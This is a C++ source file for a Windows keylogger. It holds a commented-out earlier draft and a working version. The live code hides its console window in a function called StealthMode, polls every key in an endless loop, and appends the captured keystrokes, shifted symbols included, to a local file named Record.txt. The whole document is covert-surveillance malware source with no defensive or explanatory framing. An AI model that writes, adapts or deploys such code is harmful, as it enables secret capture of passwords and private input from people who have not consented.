// #include <iostream>
// #include <windows.h>
// #include <winuser.h>

// using namespace std;

// int SaveLogs(int keyStroke, char *file);
// void Stealth();

// int main()
// {
//     Stealth();

//     char i;

//     while (1)
//     {
//         for (i = 8; i <= 190; i)
//         {
//             if (GetAsyncKeyState(i) == -32767)
//             {
//                 SaveLogs(i, "mylogs.txt");
//             }
//         }
//     }

//     system("PAUSE");

//     return 0;
// }

// int SaveLogs(int key_stroke, char *file)
// {
//     if ((key_stroke == 1) || (key_stroke == 2))
//         return 0;

//     FILE *OUTPUT_FILE;
//     OUTPUT_FILE = fopen(file, "a");

//     cout << key_stroke << endl;

//     if (key_stroke == 8)
//         fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");

//     else if (key_stroke == 13)
//         fprintf(OUTPUT_FILE, "%s", "n");

//     else if (key_stroke == 32)
//         fprintf(OUTPUT_FILE, "%s", " ");

//     else if (key_stroke == VK_TAB)
//         fprintf(OUTPUT_FILE, "%s", "[TAB]");

//     else if (key_stroke == VK_SHIFT)
//         fprintf(OUTPUT_FILE, "%s", "[SHIFT]");

//     else if (key_stroke == VK_CONTROL)
//         fprintf(OUTPUT_FILE, "%s", "[CONTROL]");

//     else if (key_stroke == VK_ESCAPE)
//         fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");

//     else if (key_stroke == VK_END)
//         fprintf(OUTPUT_FILE, "%s", "[END]");

//     else if (key_stroke == VK_HOME)
//         fprintf(OUTPUT_FILE, "%s", "[HOME]");

//     else if (key_stroke == VK_LEFT)
//         fprintf(OUTPUT_FILE, "%s", "[LEFT]");

//     else if (key_stroke == VK_UP)
//         fprintf(OUTPUT_FILE, "%s", "[UP]");

//     else if (key_stroke == VK_RIGHT)
//         fprintf(OUTPUT_FILE, "%s", "[RIGHT]");

//     else if (key_stroke == VK_DOWN)
//         fprintf(OUTPUT_FILE, "%s", "[DOWN]");

//     else if (key_stroke == 190 || key_stroke == 110)
//         fprintf(OUTPUT_FILE, "%s", ".");

//     else
//         fprintf(OUTPUT_FILE, "%s", &key_stroke);

//     fclose(OUTPUT_FILE);
//     return 0;
// }

// void Stealth()
// {
//     HWND Stealth;
//     AllocConsole();
//     Stealth = FindWindowA("ConsoleWindowClass", NULL);
//     ShowWindow(Stealth, 0);
// }

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

void StealthMode();
void StartLogging();

int main()
{
    StealthMode();
    StartLogging();

    return 0;
}

void StartLogging()
{
    char c;

    for (;;)
    {

        for (c = 8; c <= 222; c++)
        {
            if (GetAsyncKeyState(c) == -32767)
            {

                ofstream write("Record.txt", ios::app);

                if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                {
                    c += 32;
                    write << c;
                    write.close();
                    break;
                }
                else if ((c > 64) && (c < 91))
                {

                    write << c;
                    write.close();
                    break;
                }
                else
                {

                    switch (c)
                    {
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << ")";
                        else
                            write << "0";
                    }
                    break;

                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "!";
                        else
                            write << "1";
                    }
                    break;

                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "@";
                        else
                            write << "2";
                    }
                    break;
                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "#";
                        else
                            write << "3";
                    }
                    break;
                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "$";
                        else
                            write << "4";
                    }
                    break;
                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "%";
                        else
                            write << "5";
                    }
                    break;
                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "^";
                        else
                            write << "6";
                    }
                    break;
                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "&";
                        else
                            write << "7";
                    }
                    break;
                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "*";
                        else
                            write << "8";
                    }
                    break;
                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "(";
                        else
                            write << "9";
                    }
                    break;

                    case VK_SPACE:
                        write << " ";
                        break;
                    case VK_RETURN:
                        write << "\n";
                        break;
                    case VK_TAB:
                        write << "  ";
                        break;
                    case VK_BACK:
                        write << "<BACKSPACE>";
                        break;
                    case VK_DELETE:
                        write << "<Del>";
                        break;

                    default:
                        write << c;
                    }
                }
            }
        }
    }
}
void StealthMode()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}
